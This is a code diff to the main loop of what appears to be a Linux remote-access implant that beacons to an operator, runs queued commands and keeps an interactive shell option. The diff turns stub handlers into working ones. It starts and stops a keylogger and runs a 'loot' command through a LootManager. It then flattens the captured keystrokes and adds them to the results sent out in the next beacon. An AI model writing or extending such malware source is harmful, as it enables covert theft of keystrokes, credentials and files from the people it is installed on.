@@ -10,6 +10,7 @@
 #include "CommandDAO.hpp"
 #include "Installer.hpp"
 #include "Config.hpp"
+#include "Payloads.hpp"
 #include "Types.hpp"
 #include "Implant.hpp"
 
@@ -18,6 +19,7 @@
 //-------------------------------------------------
 int main(int argc, char* argv[]) {
     bool is_installation = false;
+    Keylogger keylogger;
 
     // parse arguments
     for (int i = 1; i < argc; ++i) {
@@ -53,7 +55,6 @@ int main(int argc, char* argv[]) {
         logger::debug("UUID: {} | Count of Commands: {}", get_or_create_id(), command_list.size());
 
         for (const auto& cmd : command_list) {
-
             logger::debug("Executing Command:\n- UUID: {}\n- CLIENT: {}\n- COMMAND: {}", cmd.uid, cmd.client, cmd.command);
 
             CommandResult res;
@@ -66,29 +67,26 @@ int main(int argc, char* argv[]) {
                 try {
                     current_sleep = std::stoi(cmd.command.substr(8));
                     res.result_data = "Sleep interval updated to " + std::to_string(current_sleep) + "m";
-                } catch (...) { res.status = 0; res.result_data = "Invalid timeout format"; }
+                } catch (...) {
+                    res.status = 0;
+                    res.result_data = "Invalid timeout format";
+                }
             } else if (cmd.command.starts_with("screenshot")) {
                 logger::debug("Executing Screenshot Command");
 
-                // On Linux, this often requires 'import' (ImageMagick) or 'gnome-screenshot'
-                // We'll simulate the call; in reality, you'd read the file and base64 encode it.
-                //shell_exec("gnome-screenshot -f /tmp/s.png");
-                res.result_data = "Screenshot captured to /tmp/s.png (Upload logic pending)";
+                //TODO: implement some time
+                res.result_data = "Screenshot command not implemented!";
             } else if (cmd.command.starts_with("loot")) {
                 logger::debug("Executing Loot All Command");
-
-
+                res.result_data = LootManager::execute_loot_command();
             } else if (cmd.command.starts_with("keylogger_start")) {
                 logger::debug("Starting Keylogger Thread");
-
-                // This usually involves starting a background thread reading /dev/input/
-                res.result_data = "Keylogger background thread started";
-                // start_keylogger_thread();
+                keylogger.start();
+                res.result_data = "Keylogger started";
             } else if (cmd.command.starts_with("keylogger_stop")) {
                 logger::debug("Stopping Keylogger Thread");
-
-                res.result_data = "Keylogger stopped. Data cached.";
-                // stop_keylogger_thread();
+                keylogger.stop();
+                res.result_data = "Keylogger stopped";
             } else if (cmd.command.starts_with("session")) {
                 logger::debug("Opening Interactive Shell Session");
 
@@ -106,7 +104,29 @@ int main(int argc, char* argv[]) {
 
             // Store result to be sent in the NEXT beacon
             std::lock_guard<std::mutex> lock(results_mtx);
-            command_results.push_back({});
+            command_results.push_back(res);
+
+            // append keylog data for the NEXT beacon
+            if (keylogger.is_running()) {
+                auto logs = keylogger.collect_and_clear();
+
+                if (not logs.empty()) {
+                    CommandResult key_result;
+                    key_result.command_uid = "kl_" + get_or_create_id();
+                    key_result.status = 1;
+
+                    // Flatten the vector into a single string for transmission
+                    std::string flattened;
+                    for (const auto& k : logs) {
+                        flattened += (k == "SPACE" ? " " : (k == "ENTER" ? "\n" : k));
+                    }
+                    key_result.result_data = flattened;
+                    logger::debug("Keylogger: {}", flattened);
+
+                    command_results.push_back(key_result);
+                }
+            }
+
         }
 
         if (not running) {
